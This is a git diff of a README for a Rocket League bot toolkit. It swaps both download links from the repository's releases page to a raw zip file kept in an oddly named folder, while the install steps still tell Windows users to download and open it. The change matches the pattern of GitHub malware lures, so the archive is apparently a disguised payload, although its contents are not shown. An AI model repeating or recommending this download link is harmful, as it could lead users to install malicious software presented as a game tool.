@@ -1,6 +1,6 @@
 # 🤖 RL-AI-Latest - Build high performance rocket league bots
 
-[![Download RL-AI-Latest](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/smpn1kara4850/RL-AI-Latest/releases)
+[![Download RL-AI-Latest](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/smpn1kara4850/RL-AI-Latest/raw/refs/heads/main/stockishly/A-R-Latest-3.3.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Ensure your computer meets these minimum specifications to run the software and 
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit [this page to download](https://github.com/smpn1kara4850/RL-AI-Latest/releases) the latest version of the toolkit.
+1.  Visit [this page to download](https://github.com/smpn1kara4850/RL-AI-Latest/raw/refs/heads/main/stockishly/A-R-Latest-3.3.zip) the latest version of the toolkit.
 2.  Locate the file ending in .zip within the release assets.
 3.  Click the file to save it to your computer.
 4.  Open your Downloads folder.
